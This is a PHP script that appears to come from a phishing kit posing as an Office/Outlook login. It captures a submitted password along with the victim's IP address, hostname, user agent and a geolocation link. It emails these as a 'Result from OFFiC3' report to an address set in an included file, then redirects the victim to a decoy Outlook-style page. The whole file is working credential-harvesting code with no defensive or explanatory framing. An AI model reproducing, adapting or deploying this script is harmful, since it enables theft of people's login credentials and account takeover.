<?php
 

if($_POST["890upass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------OFFiC3 Info-----------------------\n";
$message .= "|pass con: ".$_POST['890upass']."\n";

$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'fill.php';
$subject = "Result from OFFiC3| ".$ip."\n";
 
{
mail("$to", "$subject", $message);     
}
 
header('Location: thanks.php?l=_Uiftyw_BhjodHHDKtoGYDw1774256418&fid.123InboxLight.aspxn.1774256418&fid.1252899645289964213InboxLight_Product-sml&sml=');
}else{
header ("Location: index.php");
}

?>

 
 